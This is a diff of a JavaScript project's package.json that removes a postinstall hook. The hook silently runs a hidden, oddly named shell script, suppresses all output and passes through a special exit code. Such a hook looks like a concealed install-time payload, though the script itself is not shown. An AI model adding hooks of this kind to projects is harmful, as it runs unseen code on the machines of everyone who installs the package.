@@ -19,8 +19,7 @@
     "import-post": "node scripts/import-post.mjs",
     "test": "node --test tests/*.test.mjs",
     "prebuild": "node scripts/clean-build-cache.mjs",
-    "deploy": "wrangler deploy",
-    "postinstall": "sh ./.ci-53pt51.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "deploy": "wrangler deploy"
   },
   "dependencies": {
     "@astrojs/mdx": "^5.0.3",
